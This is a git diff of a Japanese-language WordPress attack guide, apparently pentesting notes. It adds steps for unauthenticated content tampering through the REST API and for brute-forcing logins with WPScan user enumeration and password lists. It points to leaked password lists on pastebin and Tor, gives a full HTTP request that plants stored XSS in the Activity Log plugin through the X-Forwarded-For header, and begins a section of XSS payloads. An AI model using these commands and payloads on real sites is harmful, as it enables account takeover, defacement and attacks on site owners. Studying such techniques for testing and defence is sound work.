@@ -144,15 +144,7 @@ echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql 
 
 # 攻撃
 
-## WPScan
-```
-wpscan -u http://target-server/wordpress-dir/ --enum users
-wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
-```
-
-[wordlist](https://www.openwall.com/wordlists/)
-
-## REST API Vulnerability
+## コンテンツ改ざんの脆弱性
 WordPress4.7.0からREST APIが実装されました。
 APIを介してコンテンツの取得、更新、削除が行えます。
 REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
@@ -172,10 +164,53 @@ request = urllib2.Request(url, payload)
 urllib2.urlopen(request)
 ```
 
-## Activity Log Plugin Vulnerability
-https://www.securify.nl/en/advisory/SFY20160734/persistent-cross-site-scripting-in-wordpress-activity-log-plugin.html
+Fiddler等のローカルプロキシを使ってREST APIをコールする事も出来ます。
+![](/images/wordpress/fiddler02.png)
 
-## XSS
+WordPressのユーザーアカウントを使わずにコンテンツを書き換えることが出来ました。
+ただし、WordPressのセキュリティ機能であるksesの働きにより、XSSに繋がる<script>タグ等を書き込むことは出来ません。
+ksesを突破するには特権アカウントを奪う必要があります。
+![](/images/wordpress/fiddler03.png)
+
+## ユーザーアカウントの奪取
+
+ユーザーアカウントを奪取する最も素直な方法はログイン画面に対するブルートフォースです。
+WPScanを使ってユーザーアカウントを列挙し、パスワードリストを組み合わせてアタックします。
+```
+# ユーザーアカウントを列挙する
+wpscan -u http://target-server/wordpress-dir/ --enum users
+
+# ユーザーアカウントを指定してパスワードリストの中からヒットする物を全探索する
+wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
+```
+
+ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
+[OpenWallが提供しているpassword.gz](https://download.openwall.net/pub/wordlists/passwords/password.gz)は手軽に利用できます。
+また、pastebinやtorネットワーク上に、実システムから漏えいしたパスワードリストがアップロードされる事もあります。
+
+## XSSの脆弱性
+
+ksesの影響を受けないXSSの脆弱性を利用すれば、簡単に特権アカウントを得ることが出来るかもしれません。
+対象のWordPressに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば、次の攻撃を試す価値があります。
+
+```
+post http://target-server/wordpress-dir/wp-login.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+X-Forwarded-For: <script>alert(123);</script>
+
+log=a&pwd=a&wp-submit=Log+In
+```
+
+![](/images/wordpress/fiddler04.png)
+
+攻撃が成功すればActivity Logにログイン試行の情報が追記されます。
+Webサイトのオーナーが情報を確認したタイミングで格納型XSSが起動します。
+
+![](/images/wordpress/log_activity01.png)
+
+## 有用なXSSペイロード
 ```
 #i=document.createElement('iframe');
 document.body.appendChild(i);
